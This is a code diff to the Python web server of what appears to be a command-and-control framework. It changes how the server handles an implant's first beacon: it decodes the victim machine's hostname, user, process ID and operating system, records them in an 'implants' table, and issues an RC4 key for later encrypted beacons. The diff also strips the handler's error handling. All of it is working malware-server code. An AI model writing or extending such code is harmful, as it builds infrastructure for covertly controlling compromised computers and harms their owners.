@@ -85,7 +85,7 @@ class WebServer(object):
             This function checks if a specified string is base64 encoded
         """
         try:
-            base64.b64decode(string)
+            base64.b64decode(string).decode()
             return True
 
         except Exception:
@@ -100,44 +100,35 @@ class WebServer(object):
 
         # if initial beacon
         if self.is_base64(self.data) is True:
-            try:
-                # base64 decodes
-                decoded = base64.b64decode(self.data).decode()
+            # base64 decodes
+            decoded = base64.b64decode(self.data).decode()
 
-                # parses json post data
-                j = json.loads(decoded)
-                hostname = j["h"]
-                operating_system = j["o"]
-                process_id = j["p"]
-                current_user = j["u"]
+            # parses json post data
+            j = json.loads(decoded)
+            hostname = j["h"]
+            operating_system = j["o"]
+            process_id = j["p"]
+            current_user = j["u"]
 
-                # generates a random 32 character encryption key (only lower/upper letters, no numbers)
-                # numbers fucks up the rc4 crypt() function for some reason
-                encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
+            # generates a random 32 character encryption key (upper, lower, and numbers)
+            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))
 
-                # gets current time (uses server's time)
-                now = datetime.datetime.now()
-                time = now.strftime("%Y-%m-%d %H:%M:%S")
+            # gets current time (uses server's time)
+            now = datetime.datetime.now()
+            time = now.strftime("%Y-%m-%d %H:%M:%S")
 
-                # inserts an entry into the "implants" table
-                with self.connection.cursor() as cursor:
-                    statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
-                    cursor.execute(statement, (hostname,
-                                               current_user,
-                                               process_id,
-                                               operating_system,
-                                               time,
-                                               encryption_key))
+            # inserts an entry into the "implants" table
+            with self.connection.cursor() as cursor:
+                statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
+                cursor.execute(statement, (hostname,
+                                           current_user,
+                                           process_id,
+                                           operating_system,
+                                           time,
+                                           encryption_key))
 
-                # returns base64 encoded encryption key in the http response
-                return base64.b64encode(encryption_key.encode())
-
-            except UnicodeDecodeError:
-                return "random weird exception where we need that's actually an rc4 beacon"
-
-            except Exception as e:
-                print("ERROR!")
-                return str(e)
+            # returns base64 encoded encryption key in the http response
+            return base64.b64encode(encryption_key.encode())
 
         # else rc4 beacon
         else:
